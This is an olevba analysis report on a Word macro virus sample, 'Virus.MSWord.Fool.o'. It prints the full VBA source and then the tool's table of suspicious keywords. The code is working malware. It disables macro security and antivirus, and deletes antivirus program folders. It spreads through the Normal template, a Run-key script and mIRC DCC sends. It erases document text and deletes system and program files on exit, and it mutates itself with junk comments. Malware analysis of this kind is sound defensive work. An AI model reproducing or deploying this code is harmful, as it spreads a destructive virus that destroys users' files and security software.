olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Fool.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Fool.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub init()
On Error Resume Next
    Rem 36.40583    86.82381    1.601133    200.2557    4.344418
    Rem 9.226954    14.78107    86.6524 85.27317    6.261892
ActiveDocument.ReadOnlyRecommended = False
If NormalTemplate.VBProject.VBComponents.Item("init").Name <> "init" Then
ActiveDocument.VBProject.VBComponents("init").Export ("C:\Windows\init.drv")
SetAttr "C\Windows\init.drv", 6
End If
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0&
    Rem 39,3149 47,97201    95,37158    45,51404    27,61233
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DAT") = "Just for FUN by FÖV"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "DATFile") = "No need Anti Virus"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\virusscan", "DAT") = "Don't Underestimate Me"
With Application
    Rem 39.3149 47.97201    95.37158    45.51404    27.61233
.EnableCancelKey = wdCancelDisabled
    Rem 3,383723    71,38778    64,5328 97,35264    7,053098
.DisplayAlerts = wdAlertsNone
    Rem 3.383723    71.38778    64.5328 97.35264    7.053098
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 3.383723    71.38778    64.5328 97.35264    7.053098
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 24.13545    68.39811    41.7654 79.5073 23.43737
    Rem 22.48185    51.56582    129.7814    121.8813    38.46128
    Rem 24.82572    62.90014    84.8737 85.45617    55.75926
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 23.80177    86.33438    92.14497    103.8191    57.40503
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 25.18843    81.51569    44.43261    164.8946    22.35525
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
    Rem 10.55574    61.1022 77.21533    74.97485    8.848884
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If (Second(Now()) > 50) Then
    Installed = Dir("C:\mirc\mirc32.exe")
    Rem 0.5661383   13.64913    64.15929    39.50768    57.79233
    Rem 50,78949    55,81886    59,11349    31,34161    28,31872
    Rem 6.035619    26.15198    67.80933    117.3947    18.34615
    Rem 35.88072    81.03005    39.37143    199.4802    49.92506
    Rem 50.78949    55.81886    59.11349    31.34161    28.31872
    If Installed = "" Then
    Exit Sub
    Rem 50.78949    55.81886    59.11349    31.34161    28.31872
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Else
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    Rem 0.0132671   48.31147    111.6993    114.2429    48.8173
    reproduce = Dir("C:\mirc\download\IRC-Rules.doc")
    Rem 28,44907    86,8828 94,77517    190,9329    38,77813
    If reproduce = "" Then ActiveDocument.SaveAs "c:\mirc\download\IRC-Rules.doc"
    Kill "C:\mirc\script.ini"
    Open "C:\mirc\script.ini" For Output As #1
    Print #1, "[script]"
    Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick C:\mirc\download\IRC-Rules.doc }"
    Print #1, "n1=on 1:CONNECT: {"
    Print #1, "n2=  /join #virus "
    Print #1, "n3=  /msg #virii by FÖV"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n4= /part #virus"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n5= /clear"
    Rem 51.01891    8.813685    75.45663    57.31884    51.48026
    Print #1, "n6= /motd"
    Print #1, "n7= }"
    Rem 19.08264    0.2255094   126.1982    176.5863    16.43678
    Rem 4,272658    38,94836    163,076 113,8261    29,16823
    Close #1
    Rem 13.03062    83.29054    43.7757 53.74134    42.15469
    End If
End If
JsLw = Int(Rnd * 100)
    If JsLw = 99 Then MsgBox "SkRiPsI is SuCK", vbSystemModal
If Month(Now()) = 1 Or 2 Or 3 Or 4 Or 5 Or 6 Or 12 Then Call Hapus
If Month(Now()) = 11 And Day(Now()) = 5 Then MsgBox "Happynes to all of you", vbInformation, "Birthday Greeting!!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "init") = "C:\Windows\System\init.vbs"
Open "C:\Windows\System\init.vbs" For Output As #1
         Print #1, "On Error Resume Next"
    Rem 54,65522    11,73784    4,910583    72,53224    32,31244
    Rem 52.9473 83.97471    168.7373    176.3131    24.15007
    Rem 54.65522    11.73784    4.910583    72.53224    32.31244
         Print #1, "' init.vbs by FÖV DJ"
         Print #1, "Set WordObj = CreateObject(""Word.Application"")"
    Rem 34,05532    44,08474    115,7393    186,186 21,8604
    Rem 20.84452    35.62598    47.85558    105.7079    8.185206
    Rem 54.65522    11.73784    4.910583    72.53224    32.31244
    Rem 34.05532    44.08474    115.7393    186.186 21.8604
    Rem 17.93792    70.60397    8.544678    108.7833    44.66474
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(""init"")"
         Print #1, "WordObj.NormalTemplate.save"
    Rem 34.05532    44.08474    115.7393    186.186 21.8604
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (""C:\Windows\init.drv"")"
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
         Print #1, "WordObj.NormalTemplate.save"
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
         Print #1, "WordObj.Quit"
    Rem 29.36302    9.573271    169.9005    141.9969    0.9265311
    Close #1
If ActiveDocument.VBProject.VBComponents.Item("init").Name <> "init" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\init.drv")
    ActiveDocument.Save
    End If
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
BxUiSjEj:
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
Call Polymorphic
    Rem 35.36757    76.419  84.65476    39.43278    52.90038
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 36.71461    80.11146    47.83484    77.29177    0.8390468
    Rem 1.03449 13.73398    71.41893    115.169 32.94824
    Rem 8.824284    14.65394    109.9198    86.11538    24.35324
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
    Rem 50.56574    56.85682    106.6991    89.97584    5.780456
End Sub
    Rem 32.03664    72.70981    6.852735    11.47621    33.29409
    Rem 54.12253    68.51546    98.74934    127.1914    15.81458
    Rem 44.43676    27.86558    63.88873    84.21764    49.64423
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
Sub HelpAbout()
    Rem 12.94052    43.24273    43.28232    71.52738    2.651098
    Rem 12.94052    43.24273    43.28232    71.52738    2.651098
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 16.10768    13.52802    90.0696 46.88497    34.48723
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 22.67953    45.90427    124.6968    94.70987    19.02148
    Rem 16.10768    13.52802    90.0696 46.88497    34.48723
    Rem 12,94052    43,24273    43,28232    71,52738    2,651098
    Rem 16,10768    13,52802    90,0696 46,88497    34,48723
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    Rem 21.01059    27.08735    161.2571    205.7642    23.68109
    On Error Resume Next
    Rem 22.72782    13.74091    105.3714    20.87609    12.09778
    Msg = "Peace Words" & Chr(13) & Chr(10)
    Msg = Msg & "Welcome to my world" & Chr(13) & Chr(10)
    Msg = Msg & "Please enjoy your time" & Chr(13) & Chr(10)
    Msg = Msg & "BEFORE YOUR DIE"
    Rem 29.86176    7.26222 107.8432    86.1077 56.66495
    MsgBox Msg, 64, "Microsoft Word"
    Rem 29.86176    7.26222 107.8432    86.1077 56.66495
End Sub
    Rem 29,86176    7,26222 107,8432    86,1077 56,66495
    Rem 29.05263    38.29365    97.41227    10.50945    32.3084
Sub FileNew()
    On Error Resume Next
    Call KillAV
    Call init
Dialogs(wdDialogFileNew).Show
    Rem 23.84014    85.04739    20.66349    135.6498    20.52213
    Skip = 1
    Rem 23,84014    85,04739    20,66349    135,6498    20,52213
    Rem 48.1786 43.02127    32.40768    143.6531    44.09753
    Rem 48.1786 43.02127    32.40768    143.6531    44.09753
    Rem 17.79552    69.37495    37.06006    93.86858    13.92564
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Call init
    Call Polymorphic
    Rem 48,1786 43,02127    32,40768    143,6531    44,09753
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
End Sub
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
Sub FileSave()
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    On Error Resume Next
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 52.90742    78.43012    9.560266    199.4069    21.4771
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Call KillAV
    Rem 39.85073    59.2887 69.08488    199.5695    38.08868
    Rem 18.66564    63.94988    53.08898    167.7424    8.953617
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Call init
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 6.769555    85.87421    135.5405    146.2198    23.69467
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Call Polymorphic
    Rem 15.87945    67.72882    151.5175    172.6056    10.43632
    Rem 40.28885    14.66478    10.13487    51.09525    44.75589
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 20.07475    44.09053    26.46272    99.63643    15.17879
    Rem 29.87473    73.31976    91.95531    89.782  30.03502
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 5.905643    70.55958    78.13894    158.2745    35.16958
    Rem 27.06034    69.25562    141.9319    80.33955    11.53656
    ActiveDocument.Save
End Sub
    Rem 29.87473    73.31976    91.95531    89.782  30.03502
Sub FileClose()
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    On Error Resume Next
    Rem 14.83524    5.003414    41.45368    205.6064    3.594059
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 29,87473    73,31976    91,95531    89,782  30,03502
    Call KillAV
    Call init
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Polymorphic
    ActiveDocument.Close
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
End Sub
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
Sub FileSaveAs()
    Rem 11.35742    54.18937    154.5094    198.5089    38.55044
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Call KillAV
    Rem 11.33095    77.80811    100.0669    158.5307    54.7451
    Call init
    Call Polymorphic
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
End Sub
    Rem 27.06911    18.68646    56.05511    20.0401 34.79776
    Rem 43.64782    77.16702    15.83594    113.7934    24.50721
    Rem 11.33095    77.80811    100.0669    158.5307    54.7451
Sub FileExit()
    On Error Resume Next
    Call KillAV
    Rem 32.80408    29.66628    154.5807    161.7151    33.97656
    Rem 12.28277    52.44824    127.2506    95.85878    53.35805
    Rem 11,33095    77,80811    100,0669    158,5307    54,7451
    Call init
    Rem 53.09505    50.17509    154.5647    138.0238    26.02576
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Call Polymorphic
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Welcome"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "FÖV"
    Msg = "Please Turn-off your computer" & Chr(13) & Chr(10)
    Rem 14.86976    52.30588    35.64883    16.52887    52.83133
    Msg = Msg & "Don't Click bellow"
    MsgBox Msg, 16, "Microsoft Word"
    Kill "C:\windows\command\*.*"
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Kill "C:*.*"
    Kill "C:\progra~1\*.*"
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Msg = "You aren't obey my order" & Chr(13) & Chr(10)
    Msg = Msg & "May the God Bless You"
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 42.19114    4.815407    100.7179    98.42702    17.59176
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    MsgBox Msg, 64, "FÖV"
Finish:
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 34.6493 12.54942    10.36596    133.1801    49.47493
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
Sub AutoOpen()
    On Error Resume Next
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Call KillAV
    Call init
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 52.59303    21.88331    159.7951    24.00989    58.07094
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 38.19669    82.23458    141.9189    4.752132    32.05827
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Call Polymorphic
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
End Sub
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 43.01763    14.55693    137.3226    42.54984    56.44898
Sub AutoExit()
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    On Error Resume Next
    Rem 5.502873    9.272038    135.8103    59.74086    2.693301
    Rem 15.92594    27.17532    131.7058    2.943705    44.88269
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Rem 32.9371 81.23127    97.72704    51.48653    50.74958
    Rem 39.21654    1.411416    73.29454    84.41634    16.24243
    Rem 23.3711 16.8397 84.23187    204.3575    45.39282
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 43.01763    14.55693    137.3226    42.54984    56.44898
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    SetAttr "C:\Autoexec.bat", 0
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Open "C:\Autoexec.bat" For Append As #1
    Rem 43,01763    14,55693    137,3226    42,54984    56,44898
    Rem 54.23512    81.98679    38.56722    145.9743    57.82019
    Print #1, "ECHO OFF"
    Rem 42.50858    68.29613    52.43913    173.1628    42.40879
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "CLS"
    Print #1, "ECHO                ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"
    Print #1, "ECHO                º  *****************************************  º"
    Print #1, "ECHO                º  *               FÖV DJ                  *  º"
    Rem 39,21654    1,411416    73,29454    84,41634    16,24243
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 14.11459    8.090691    5.261603    67.77071    46.6176
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "ECHO                º  *****************************************  º"
    Print #1, "ECHO                º  FÖV DJ wishes to thank the user            º"
    Rem 29.81386    14.0672 159.5527    137.4449    29.85915
    Rem 27.74525    16.47684    168.5384    98.9922 0.237161
    Print #1, "ECHO                º  of this computer because you have          º"
    Rem 3.547013    68.04833    119.0874    104.3849    9.170705
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Rem 35.63017    23.74136    47.48815    174.2583    48.65153
    Print #1, "ECHO                º  helped to spread the good words of peace!  º"
    Rem 14.11459    8.090691    5.261603    67.77071    46.6176
    Print #1, "ECHO                º               ## FÖV DJ ##                  º"
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 22.26755    73.04142    126.1027    91.90942    4.600854
    Print #1, "ECHO                ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½"
    Print #1, "CLS"
    Close #1
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Call KillAV
    Rem 14,11459    8,090691    5,261603    67,77071    46,6176
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Call init
    Rem 54.82243    30.58255    84.18592    86.72324    41.02163
    Call Polymorphic
End Sub
Sub AutoExec()
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    On Error Resume Next
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Call KillAV
    Call init
    Rem 41.3771 35.9039 153.5268    156.6615    5.225011
    Call Polymorphic
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 54.82243    30.58255    84.18592    86.72324    41.02163
End Sub
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
Sub ToolsMacro()
    Beep
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 54,82243    30,58255    84,18592    86,72324    41,02163
    Rem 51.08323    47.71913    15.23904    159.1232    23.70868
    Call Pesan1
    Rem 3.841807    22.32626    161.5703    172.1755    12.9487
    Call Polymorphic
    On Error Resume Next
    Rem 2.362124    36.51704    10.02855    65.48581    35.57958
    Rem 17.94134    56.9861 35.28539    39.06284    34.41818
    Rem 41,3771 35,9039 153,5268    156,6615    5,225011
    StatusBar = "    Warning you enter the forbiden zone !!!"
    Application.Caption = "FÖV"
    Application.UserName = "DJ"
    Counter = 0
    Do Until Counter = 15
       Counter = Counter + 1
    Rem 17.8863 87.54562    136.7254    141.7135    53.40263
    mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
    Rem 31.01941    18.32241    35.29092    76.58449    33.83765
    Rem 54.41855    23.25978    29.66229    145.8676    1.002333
    Rem 22.92834    71.73113    122.5707    145.6042    43.11918
    Call Pesan2
    Loop
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Beep
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Rem 43.08557    71.20399    56.55755    94.69788    32.75168
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Call Polymorphic
End Sub
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
Sub FileTemplates()
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    Beep
    Call Polymorphic
    On Error Resume Next
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
End Sub
    Rem 38.99709    4.081748    70.38556    181.1501    46.63832
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
Sub ViewVBCode()
    Beep
    Rem 31.98265    65.64698    24.65007    54.13589    1.666569
    Call Polymorphic
    Rem 1.03171 18.93318    12.57207    22.14506    19.56997
    On Error Resume Next
    Rem 33.5738 33.6989 66.21532    180.7237    34.57034
End Sub
Sub Hapus()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Rem 12.23926    32.046  94.06137    74.67128    12.05403
End Sub
Sub Pesan1()
    On Error Resume Next
    Msg = "Macro Function is not active" & Chr(13) & Chr(10)
    Msg = Msg & "Never use IT"
    MsgBox Msg, 16, "Microsoft Word"
End Sub
Sub Pesan2()
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    On Error Resume Next
    Msg = "Did you enjoy your time ?" & Chr(13) & Chr(10)
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Msg = Msg & "Don't do it again OK!"
    Rem 29.60355    36.57792    144.0317    173.5074    39.67323
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    MsgBox Msg, 16, "Microsoft Word"
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Rem 28.44558    29.72707    147.6371    54.40281    15.31294
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
    Rem 29.60355    36.57792    144.0317    173.5074    39.67323
End Sub
    Rem 29,60355    36,57792    144,0317    173,5074    39,67323
    Rem 23.66436    61.01529    85.41717    107.8849    27.31582
Sub Polymorphic()
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
    Rem 18.99343    61.58266    134.5489    7.442418    46.85624
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("init").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 55: b = Rnd * 90: c = Rnd * 170: d = Rnd * 210: e = Rnd * 59
Application.VBE.ActiveVBProject.VBComponents("init").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub
Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
    Rem 11,97899    34,10921    67,29353    59,11572    29,6989
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
    Rem 44.14231    62.64907    70.99187    154.2425    16.35294
    Rem 32.52933    47.87907    104.5622    18.72224    10.88106
Kill "C:\Program Files\Quick Heal\*.*"
    Rem 44,14231    62,64907    70,99187    154,2425    16,35294
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |init.vbs            |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

